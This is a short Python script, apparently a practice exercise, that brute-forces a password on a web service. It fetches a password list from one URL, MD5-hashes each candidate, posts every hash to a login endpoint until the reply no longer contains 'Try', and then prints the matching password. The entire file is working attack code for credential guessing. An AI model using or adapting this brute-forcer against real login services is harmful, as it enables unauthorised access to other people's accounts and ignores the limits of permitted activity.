import requests
import hashlib


url_all_pass = "https://cyberhash.onrender.com/passwords"
url_get_in ="https://cyberhash.onrender.com/hash"


def password_list(url):
    return requests.get(url).text.split("\n")


def hashed_passes(password):
    return hashlib.md5(password.encode()).hexdigest()


def brute_force():
    for password in password_list(url_all_pass):
        bf_post = post(hashed_passes(password))
        if "Try" not in bf_post:
            print(f"yeyyyyyyyyyyyyyyyyyyyyyyyyyy the password is {password}, try {hashed_passes(password)}")
            break
        else:
            print(f"trying...{password}")

def post(hp):
    data = {"password_input":hp}
    bf_post = requests.post(url_get_in,data=data).text
    return bf_post


def main():
    brute_force()

if __name__ == "__main__":
    main()
